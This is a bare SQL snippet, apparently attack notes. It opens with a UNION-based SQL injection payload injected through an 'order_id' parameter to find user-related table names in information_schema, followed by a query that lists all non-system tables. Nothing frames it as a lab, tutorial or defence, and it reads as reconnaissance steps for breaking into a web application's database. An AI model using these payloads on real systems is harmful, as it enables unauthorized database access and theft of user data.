order_id=0 UNION SELECT table_name
FROM information_schema.TABLES
WHERE table_name LIKE '%usr%' AND table_name LIKE 'a%' LIMIT 1;

SELECT
    table_schema AS database_name,
    table_name
FROM
    information_schema.tables
WHERE
    table_schema NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')
ORDER BY
    table_name;
